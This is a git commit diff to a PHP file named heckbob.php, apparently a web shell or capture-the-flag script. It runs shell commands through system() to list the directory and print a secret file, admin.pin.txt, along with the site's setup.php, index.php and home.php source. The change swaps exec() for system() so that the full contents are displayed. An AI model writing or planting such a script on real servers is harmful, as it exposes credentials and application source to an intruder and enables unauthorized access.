106edcf4ecffd114a4457886a6ccc28691888f1e
Oluwakemi Odusanya <odus.kemi@gmail.com>
2018-03-18 16:26:31 -0400

    Update heckbob.php

--- heckbob.php
+++ heckbob.php
@@ -1,11 +1,11 @@
 <?php 
 echo system('ls');
 echo "here is for txt   \n";
-echo exec('cat admin.pin.txt');
+echo system('cat admin.pin.txt');
 echo "here is for setup  \n";
-echo exec('cat setup.php');
+echo system('cat setup.php');
 echo "here is for index \n";
-echo exec('cat index.php');
+echo system('cat index.php');
 echo "here is for home  \n";
-echo exec('cat home.php');
+echo system('cat home.php');
 ?>
